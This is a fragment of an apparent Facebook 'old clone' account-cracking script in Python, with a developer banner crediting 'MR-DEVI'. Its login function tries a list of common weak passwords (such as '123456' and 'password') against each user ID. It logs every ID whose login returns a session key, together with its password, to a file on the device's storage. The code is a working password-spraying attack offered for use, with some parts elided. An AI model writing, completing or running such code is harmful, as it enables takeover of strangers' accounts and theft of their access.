...
{B}•━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•
{style}{G0} DEVELOPER    {X}◆{G0} MR-DEVI
{style}{G0} FACEBOOK    {X}◆{G0} 乛 Dɘvɩ ːꜛᏯ ː同
{style}{G0} TOOL TYPE   {X}◆{X} OLD CLONE
{style}{G0} GITHUB      {X}◆{G0} devixayyat 
...
def login(uid):
    ...
    try:
        sys.stdout.write(f"\r \x1b[38;5;196m[\033[38;5;46mDEVI\x1b[1;97m-\033[38;5;46mOLD\x1b[38;5;196m] \033[38;5;46m[{loop}-{len(oks)}]")
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","1234567","12345678","123456789","123123", "@#@#@#"," @@@###","@@@@@@","102030","usausa","facebook","password"]:
            ...
            if "session_key" in rp:
                ...
                open("/sdcard/DEVI-loginAfter3day.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
                ...
                open("/sdcard/DEVI-loginAfter3day.txt.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
